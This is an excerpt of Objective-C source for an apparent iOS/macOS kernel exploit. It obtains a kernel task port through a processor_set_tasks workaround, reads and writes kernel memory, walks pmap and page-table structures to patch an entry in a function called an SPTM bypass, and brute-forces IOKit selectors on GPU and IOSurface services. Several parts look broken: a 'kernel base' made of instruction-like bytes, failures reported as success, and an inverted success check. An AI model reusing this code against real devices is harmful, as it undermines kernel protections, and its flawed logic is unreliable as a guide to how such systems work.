...
extern kern_return_t processor_set_default(host_t host, processor_set_t *processor_set);
extern kern_return_t host_processor_set_priv(host_t host, processor_set_t set, processor_set_t *control);
extern kern_return_t processor_set_tasks(processor_set_t processor_set, task_array_t *task_list, mach_msg_type_number_t *task_count);
extern kern_return_t pid_for_task(task_t task, int *pid);

extern mach_port_t kernel_task_port;

uint64_t get_kernel_slide(DebugLogger *logger) {
    uint64_t slide = 0;
    size_t size = sizeof(slide);
    if (sysctlbyname("kern.kaslr_slide", &slide, &size, NULL, 0) == 0) {
        [logger logMessage:[NSString stringWithFormat:@"[INFO] Got kernel slide from sysctl: 0x%llx", slide]];
        return slide;
    }
    [logger logMessage:@"[WARN] Failed to get kernel slide via sysctl"];
    return 0;
}

uint64_t get_kernel_base(DebugLogger *logger) {
    void *handle = dlopen("/usr/lib/system/libsystem_kernel.dylib", RTLD_NOW);
    if (!handle) {
        [logger logMessage:[NSString stringWithFormat:@"[WARN] Failed to dlopen libsystem_kernel: %s", dlerror()]];
        return 0;
    }

    void *syscall_addr = dlsym(handle, "mach_task_self");
    dlclose(handle);

    if (!syscall_addr) {
        [logger logMessage:@"[WARN] Failed to find mach_task_self symbol"];
        return 0;
    }

    uint64_t syscall_target = *(uint64_t *)((uint8_t *)syscall_addr + 4);
    uint64_t kernel_base = syscall_target & ~0x3FFF;
    [logger logMessage:[NSString stringWithFormat:@"[DEBUG] syscall_target: 0x%llx, kernel_base: 0x%llx", syscall_target, kernel_base]];

    if (kernel_base == 0) {
        [logger logMessage:@"[WARN] Kernel base calculated as 0"];
    }
    return kernel_base;
}

uintptr_t get_kernel_slide_from_header(uintptr_t kernel_header, DebugLogger *logger) {
    ...
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        if (lc->cmd == LC_SEGMENT_64) {
            ...
            if (strcmp(seg->segname, "__TEXT") == 0) {
                uintptr_t slide = (uintptr_t)mh - seg->vmaddr;
                [logger logMessage:[NSString stringWithFormat:@"[INFO] Kernel slide from __TEXT: 0x%lx", slide]];
                return slide;
            }
        }
    ...
    [logger logMessage:@"[WARN] Failed to find __TEXT segment for kernel slide"];
    return 0;
}

task_port_t task_for_pid_workaround(int pid, DebugLogger *logger) {
    ...
    if (kr != KERN_SUCCESS) {
        [logger logMessage:[NSString stringWithFormat:@"[ERROR] processor_set_default failed: %s", mach_error_string(kr)]];
        return MACH_PORT_NULL;
    }

    kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
    if (kr != KERN_SUCCESS) {
        [logger logMessage:[NSString stringWithFormat:@"[ERROR] host_processor_set_priv failed: %s", mach_error_string(kr)]];
        return MACH_PORT_NULL;
    }

    kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
    if (kr != KERN_SUCCESS) {
        [logger logMessage:[NSString stringWithFormat:@"[ERROR] processor_set_tasks failed: %s", mach_error_string(kr)]];
        return MACH_PORT_NULL;
    }
    ...
    for (int i = 0; i < numTasks; i++) {
        ...
        [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Task %d PID: %d", i, task_pid]];
        if (task_pid == pid) {
            return tasks[i];
        }
    }

    [logger logMessage:[NSString stringWithFormat:@"[WARN] No task found for PID %d", pid]];
    return MACH_PORT_NULL;
}

kern_return_t kb_init_kernel(DebugLogger *logger) {
    uint64_t kernel_base_hardcoded = 0xd10103ffd5030000;
    [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Hardcoded kernel_base: 0x%llx", kernel_base_hardcoded]];
    ...
    if (kernel_header) {
        uintptr_t kernel_slide = get_kernel_slide_from_header((uintptr_t)kernel_header, logger);
        if (kernel_slide) {
            kernel_base_hardcoded -= kernel_slide;
            [logger logMessage:[NSString stringWithFormat:@"[INFO] Adjusted kernel base with slide: 0x%llx", kernel_base_hardcoded]];
        }
    } else {
        [logger logMessage:@"[WARN] No kernel image found for slide calculation"];
    }
    
    get_kernel_slide(logger);
    get_kernel_base(logger);

    kernel_task_port = task_for_pid_workaround(0, logger);
    if (kernel_task_port != MACH_PORT_NULL) {
        [logger logMessage:@"[INFO] Successfully obtained kernel_task_port via workaround"];
        return KERN_SUCCESS;
    } else {
        [logger logMessage:@"[WARN] task_for_pid_workaround failed—falling back to stub"];
        return KERN_SUCCESS;
    }
}
...
uint64_t kb_kernel_read64(uint64_t addr) {
    if (kernel_task_port == MACH_PORT_NULL) return 0;
    uint64_t value = 0;
    mach_vm_size_t size_out;
    mach_vm_read_overwrite(kernel_task_port, addr, sizeof(uint64_t), (mach_vm_address_t)&value, &size_out);
    return value;
}
...
+ (void)scanMemory:(void *)base size:(size_t)size step:(size_t)step logger:(DebugLogger *)logger {
    for (size_t offset = 0; offset < size; offset += step) {
        ...
        [logger logMemoryAtAddress:addr length:256];
...
+ (void)runSPTMBypassWithLogger:(DebugLogger *)logger {
    ...
    uint64_t kernel_base = 0xd10103ffd5030000;
    const struct mach_header *kernel_header = NULL;
    for (uint32_t i = 0; i < _dyld_image_count(); i++) {
        const char *name = _dyld_get_image_name(i);
        if (strstr(name, "kernel")) {
    ...
    if (kernel_header) {
        ...
        if (kernel_slide) {
            ...
            [logger logMessage:[NSString stringWithFormat:@"[INFO] Using adjusted kernel_base: 0x%llx", kernel_base]];
        }
    }
    const uint64_t KERNEL_PMAP_ADDR = kernel_base + 0x800000;
    const uint64_t TASK_STRUCT_ADDR = kernel_base + 0x1000000;
    const uint64_t VM_MAP_OFFSET = 0x10;
    const uint64_t PMAP_OFFSET = 0x40;
    const uint64_t TTEP_OFFSET = 0x8;

    uint64_t kernel_pmap = kb_kernel_read64(KERNEL_PMAP_ADDR);
    if (!kernel_pmap) {
    ...
    uint64_t task_struct = kb_kernel_read64(TASK_STRUCT_ADDR + (self_task * 8));
    uint64_t vm_map = kb_kernel_read64(task_struct + VM_MAP_OFFSET);
    uint64_t pmap = kb_kernel_read64(vm_map + PMAP_OFFSET);

    [logger logMessage:[NSString stringWithFormat:@"[INFO] Found task pmap at 0x%llx", pmap]];

    uint64_t ttep = kb_kernel_read64(pmap + TTEP_OFFSET);
    ...
    new_l3_entry |= (3ULL << 6);
    kb_kernel_write64(l3_entry_addr, new_l3_entry);
...
+ (void)runTest {
    ...
    kern_return_t kr = IOMainPort(kIOMainPortDefault, &master_port);
    if (kr != KERN_SUCCESS) {
        [logger logMessage:[NSString stringWithFormat:@"[ERROR] Failed to get IO main port: %s", mach_error_string(kr)]];
        return;
    }
    [logger logMessage:[NSString stringWithFormat:@"[INFO] Got IO main port: 0x%x", master_port]];
    ...
    io_service_t service = IOServiceGetMatchingService(master_port, IOServiceMatching("IOGPU"));
    if (service == IO_OBJECT_NULL) {
        [logger logMessage:@"[ERROR] Failed to get IOGPU service—falling back to IOSurfaceRoot"];
        service = IOServiceGetMatchingService(master_port, IOServiceMatching("IOSurfaceRoot"));
        if (service == IO_OBJECT_NULL) {
    ...
    for (int selector = 0; selector <= 10; selector++) {
        kr = IOConnectCallMethod(connection, selector, NULL, 0, &input, sizeof(input), NULL, NULL, NULL, NULL);
        if (kr == KERN_SUCCESS) {
            [logger logMessage:[NSString stringWithFormat:@"[INFO] IOConnectCallMethod succeeded at selector %d", selector]];
            break;
        }
        [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Struct selector %d failed: %s", selector, mach_error_string(kr)]];
    }
    if (kr != KERN_SUCCESS) {
        uint64_t scalar_in[1] = {IOSurfaceGetID(surface)};
        uint64_t scalar_out[1] = {0};
        uint32_t out_count = 1;
        for (int selector = 0; selector <= 10; selector++) {
            kr = IOConnectCallScalarMethod(connection, selector, scalar_in, 1, scalar_out, &out_count);
            if (kr == KERN_SUCCESS) {
                [logger logMessage:[NSString stringWithFormat:@"[INFO] IOConnectCallScalarMethod succeeded at selector %d, output: 0x%llx", selector, scalar_out[0]]];
                break;
            }
            [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Scalar selector %d failed: %s", selector, mach_error_string(kr)]];
        }
    }

    if (!kb_init_kernel(logger)) {
        [logger logMessage:@"[ERROR] Failed to initialize kernel access"];
